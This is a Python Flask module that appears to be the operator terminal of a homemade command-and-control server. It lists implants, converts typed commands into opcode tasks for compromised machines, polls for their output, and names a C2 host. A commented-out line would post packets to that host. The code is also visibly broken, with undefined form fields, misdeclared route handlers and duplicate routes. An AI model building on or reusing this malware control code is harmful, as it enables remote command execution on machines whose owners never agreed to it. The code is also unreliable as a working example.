from time import sleep
from cvnt.implant_pb2 import TaskRequest, TaskResponse
from flask import Blueprint, session, render_template, redirect, url_for, jsonify
from flask_wtf import FlaskForm 
from wtforms import StringField, SubmitField 
from wtforms.validators import DataRequired, Length 
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import  Packet
from cvnt.constants import *
from cvnt.database import db
from cvnt.db_operations import get_task_by_ids, make_task, get_list, get_implant_by_id

term = Blueprint('terminal', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/terminal/task/list"
task_create = "/terminal/task/create"
register = "/terminal/register"
request = "/terminal/request"
response = "/terminal/response"
packet = "/terminal/packet"

import random

class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@term.route('/terminal', methods=['GET', 'POST'])
def index():
    response = ["Welcome to the party :)"]
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    implants = get_list()
    whole = None
    if form.validate_on_submit():
        implant_id = form.selected_implant.data  # Access the selected implant ID
        response = analyze_input(form, implant_id)
    return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)

# parses the command inputted into the terminal and handles server request
def analyze_input(form, button_state):
    whole = form.cmd.data
    words = whole.split()
    if len(words) == 1:
        if words[0] in server_commands:
            print('printing??????')
            response = get_list()
        else:
            response = 'Invalid Command Loser :('
            cmd = words[0]
    elif words[1] in opcodes:
        main_op = OPCODE_STDLIB
        rest_string = str(to_opcode(words[1]))
        if len(words) == 2:
            new_task = handle_task_request(button_state, main_op, rest_string)
            sleep(5)
            response = new_task.task_output
            response = response.split('\n')
        else:
            first_two_words = words[:2]
            cmd = str(to_opcode(first_two_words[1]))
            rest_of_words = words[2:]
            rest_string = cmd + rest_string.join(rest_of_words)
            new_task = handle_task_request(button_state, main_op, rest_string)
            while new_task.task_output is None:
                sleep(5)
            response = new_task.task_output
            response = response.split('\n')
            
    else:
        response = 'Invalid Command Loser :(' 
        cmd = ' '.join(words)
    return response

def handle_local_request(cmd, args):
    pass
    

@term.route('/terminal/task/request', methods=["POST"])
def handle_task_request(implant_id, cmd, args):
    tr = TaskRequest()
    print(f'REQUEST FROM CLIENT')
    tr.TaskID = random.randint(10, 10000)
    tr.Opcode = cmd
    tr.Args = args
    new_task = make_task(implant_id, tr)
    print("NEW TASK MADE:")
    print(new_task)
    db.session.add(new_task)
    print("added task")
    db.session.commit()
    print("committed task")
    return new_task

@term.route(response, methods=["POST"])
def handle_task_response(implant_id, TaskID, output):
    print(f'RESPONSE FROM CLIENT')
    

@term.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)

